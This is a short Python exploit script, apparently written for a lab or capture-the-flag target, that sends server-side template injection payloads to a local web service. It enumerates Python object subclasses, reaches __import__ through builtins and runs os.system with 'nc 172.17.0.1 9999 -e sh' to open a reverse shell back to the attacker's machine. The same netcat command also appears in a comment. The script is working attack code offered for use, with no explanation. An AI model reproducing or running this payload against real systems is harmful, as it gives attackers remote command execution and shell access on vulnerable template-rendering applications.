import re
import requests
import subprocess

def get_module_index(name):
    # Get object subclasses
    injection = '{{\'\'.__class__.mro()[1].__subclasses__()}}'
    r = requests.get("http://172.17.0.2:7500/" + injection)

    # Parse object subclasses
    resp = re.search(r'\[(.*?)\]', r.text).group(0)
    text = resp.split(",")

    # Get index of class in subclasses
    item = list(filter(lambda x: name in x, text))[0]
    return text.index(item)

# import os
# os.system("nc 127.0.0.1 9999 -e sh")
injection  = '''{{ ''.__class__.mro()[1].__subclasses__()[0][0]'''
injection += '''.__init__.__globals__['__builtins__']['__import__']'''
injection += '''('os').system("nc 172.17.0.1 9999 -e sh") }}'''
r = requests.get("http://172.17.0.2:7500/" + injection)
